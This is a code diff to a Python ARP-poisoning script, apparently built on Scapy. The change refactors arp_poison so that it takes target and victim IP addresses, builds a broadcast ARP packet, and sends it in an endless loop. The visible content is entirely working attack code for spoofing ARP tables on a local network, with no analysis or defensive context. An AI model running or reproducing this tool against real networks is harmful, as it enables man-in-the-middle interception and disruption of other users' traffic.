@@ -20,7 +20,8 @@ def create_arp_packet(target, victim):
     a.hwdst = "ff:ff:ff:ff:ff:ff"
     return a
 
-def arp_poison(packet):
+def arp_poison(target_ip, victim_ip):
+    packet = create_arp_packet(target_ip, victim_ip)
     while(1>0):
         send(packet)
 
@@ -28,8 +29,7 @@ def main():
     if len(sys.argv) != 3:
         print("Usage: Give target and vicitm ip address\n")
     else:
-        packet = create_arp_packet(sys.argv[1], sys.argv[2])
-        arp_poison(packet)
+        arp_poison(sys.argv[1],sys.argv[2])
     
 if __name__ == "__main__":
     main()
